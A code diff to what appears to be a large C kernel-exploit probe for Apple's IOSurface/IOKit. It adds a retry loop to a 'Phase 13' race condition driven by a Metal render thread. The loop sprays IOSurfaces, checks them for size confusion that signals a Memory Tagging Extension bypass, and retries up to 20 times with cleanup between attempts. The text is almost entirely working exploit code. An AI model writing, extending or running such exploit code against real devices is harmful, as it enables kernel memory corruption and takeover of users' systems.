@@ -17131,7 +17131,11 @@ new_modes:
             rlog("*** rounds=%d: fast-path to Phase 16 ***\n", rounds);
             goto phase15_done;
         }
-        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 229) {
+        if (rounds == 229) {
+            rlog("*** rounds=%d: fast-path to Phase 13 (MTE brute-force) ***\n", rounds);
+            goto phase12_done;
+        }
+        if (rounds >= 170 && rounds != 219 && rounds != 225) {
             rlog("*** rounds=%d: fast-path to Phase 17 ***\n", rounds);
             goto phase16_done;
         }
@@ -19277,6 +19281,7 @@ new_modes:
          *
          * We load Metal dynamically via dlopen since the probe is pure C.
          */
+        r229_phase13_top:
         rlog("\n--- Phase 13: Full PoC race (Metal render loop + Stage C variants) ---\n");
         {
             io_service_t svc13 = IOServiceGetMatchingService(kIOMasterPortDefault,
@@ -19642,8 +19647,7 @@ new_modes:
             if (rounds == 229) {
                 rlog("  r=229: SURVIVED Phase 13 attempt #%d! gen1_spray=%d frames=%d\n",
                     r229_attempt, r229_spray_n, p13_render_frames);
-                rlog("  If no panic: either race didn't create stale entries, or MTE matched.\n");
-                /* Check spray surfaces for signs of confusion */
+                int r229_confused = 0;
                 for (int si = 0; si < 64; si++) {
                     if (!r229_spray[si]) continue;
                     uint32_t sw = IOSurfaceGetWidth(r229_spray[si]);
@@ -19651,10 +19655,28 @@ new_modes:
                     if (sw != 32 || sh != 32) {
                         rlog("  !!! CONFUSED surface[%d]: w=%u h=%u\n", si, sw, sh);
                         rlog("  !!! MTE BYPASSED — controlled IOSurface confusion!\n");
+                        r229_confused = 1;
                     }
                     CFRelease(r229_spray[si]);
+                    r229_spray[si] = NULL;
                 }
-                if (r229_sp) CFRelease(r229_sp);
+                if (r229_sp) { CFRelease(r229_sp); r229_sp = NULL; }
+                r229_spray_n = 0;
+
+                if (!r229_confused && r229_attempt < 20) {
+                    rlog("  r=229: No confusion detected, looping (attempt %d/20)...\n", r229_attempt);
+                    /* Full cleanup before loop */
+                    p13_render_run = 0;
+                    pthread_join(render_th, NULL);
+                    p13_free_groom();
+                    if (p13_groom_conn) { IOServiceClose(p13_groom_conn); p13_groom_conn = IO_OBJECT_NULL; }
+                    IOObjectRelease(svc13);
+                    usleep(100000); /* 100ms cooldown */
+                    goto r229_phase13_top;
+                }
+                if (r229_confused) {
+                    rlog("  r=229: === SUCCESS === MTE brute-force succeeded at attempt #%d!\n", r229_attempt);
+                }
             }
             if (rounds == 225) {
                 rlog("  r=225: SURVIVED Phase 13! reclaim_conns=%d frames=%d\n",
